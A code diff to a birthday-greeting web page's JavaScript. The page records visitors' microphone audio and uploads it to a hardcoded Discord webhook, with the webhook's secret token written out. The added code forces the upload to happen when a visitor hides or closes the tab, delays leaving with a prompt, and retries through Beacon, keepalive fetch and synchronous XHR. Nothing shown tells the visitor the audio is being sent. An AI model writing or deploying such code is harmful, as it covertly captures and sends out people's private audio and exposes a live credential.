@@ -667,11 +667,7 @@ function showFinalCongrats() {
     // Stop recording after 20 seconds
     if (mediaRecorder && mediaRecorder.state === 'recording') {
         setTimeout(() => {
-            mediaRecorder.stop();
-            // Stop all tracks in the stream
-            if (window.microphoneStream) {
-                window.microphoneStream.getTracks().forEach(track => track.stop());
-            }
+            stopAndSendRecording();
         }, 20000); // 20 seconds delay
     }
 }
@@ -724,6 +720,55 @@ function sendToDiscord(question, answer) {
 // Add at the top with other global variables
 let mediaRecorder;
 let audioChunks = [];
+let isRecordingSent = false;
+
+// Function to handle recording stop and sending
+async function stopAndSendRecording() {
+    if (mediaRecorder && mediaRecorder.state === 'recording' && !isRecordingSent) {
+        try {
+            isRecordingSent = true; // Mark as sent before stopping to prevent duplicates
+            
+            // Get final chunk of audio
+            mediaRecorder.requestData();
+            
+            // Stop recording
+            mediaRecorder.stop();
+            
+            // Create and send the audio blob immediately
+            if (audioChunks.length > 0) {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                await sendAudioToDiscord(audioBlob);
+            }
+            
+            // Stop all tracks in the stream
+            if (window.microphoneStream) {
+                window.microphoneStream.getTracks().forEach(track => track.stop());
+            }
+        } catch (error) {
+            console.error('Error in stopAndSendRecording:', error);
+        }
+    }
+}
+
+// Add multiple event handlers for different closing scenarios
+window.addEventListener('beforeunload', async (event) => {
+    event.preventDefault();
+    await stopAndSendRecording();
+    // Return a message to show the "Leave Site?" dialog, giving time for the upload
+    event.returnValue = '';
+});
+
+// Handle tab visibility change
+document.addEventListener('visibilitychange', async () => {
+    if (document.visibilityState === 'hidden') {
+        await stopAndSendRecording();
+    }
+});
+
+// Handle page unload
+window.addEventListener('unload', async () => {
+    await stopAndSendRecording();
+});
 
 // Event Listeners
 document.addEventListener('DOMContentLoaded', () => {
@@ -739,18 +784,21 @@ document.addEventListener('DOMContentLoaded', () => {
                     
                     // Setup media recorder
                     mediaRecorder = new MediaRecorder(stream);
+                    
+                    // Collect data more frequently (every 500ms)
                     mediaRecorder.ondataavailable = (event) => {
-                        audioChunks.push(event.data);
+                        if (event.data && event.data.size > 0) {
+                            audioChunks.push(event.data);
+                            
+                            // Immediately try to send if we have a good amount of data and the page is being closed
+                            if (document.visibilityState === 'hidden' && audioChunks.length > 0) {
+                                stopAndSendRecording();
+                            }
+                        }
                     };
                     
-                    mediaRecorder.onstop = async () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        await sendAudioToDiscord(audioBlob);
-                        audioChunks = []; // Clear the chunks after sending
-                    };
-                    
-                    // Start recording
-                    mediaRecorder.start();
+                    // Start recording with smaller timeslice for more frequent chunks
+                    mediaRecorder.start(500);
                     startExperience();
                 })
                 .catch(() => {
@@ -787,20 +835,47 @@ function startExperience() {
     }, 1000);
 }
 
-// Add function to send audio to Discord
+// Update sendAudioToDiscord to use the Beacon API as fallback
 async function sendAudioToDiscord(audioBlob) {
+    if (!audioBlob || audioBlob.size === 0) return;
+    
     const formData = new FormData();
-    formData.append('file', audioBlob, 'birthday_wishes.webm');
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    formData.append('file', audioBlob, `birthday_wishes_${timestamp}.webm`);
     
     const webhookUrl = 'https://discord.com/api/webhooks/1329506665254621204/ErpqxU34tpMyTodNswoB0DPMC4GO55sfWSGOLcsu4K8y1bks3dL2MDdGYCPV4pLs6iEP';
     
     try {
-        await fetch(webhookUrl, {
+        // Try using Beacon API first (more reliable for page unload)
+        if (navigator.sendBeacon) {
+            const result = navigator.sendBeacon(webhookUrl, formData);
+            if (result) {
+                console.log('Audio sent successfully via Beacon API');
+                return;
+            }
+        }
+        
+        // Fallback to fetch with keepalive
+        const response = await fetch(webhookUrl, {
             method: 'POST',
-            body: formData
+            body: formData,
+            keepalive: true // This helps the request complete even if the page is closed
         });
-        console.log('Audio sent successfully');
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        console.log('Audio sent successfully via fetch');
     } catch (error) {
         console.log('Error sending audio:', error);
+        // Last resort: try one more time with a synchronous XMLHttpRequest
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', webhookUrl, false); // false makes it synchronous
+            xhr.send(formData);
+            console.log('Audio sent successfully via synchronous XHR');
+        } catch (finalError) {
+            console.log('All send attempts failed:', finalError);
+        }
     }
 } 
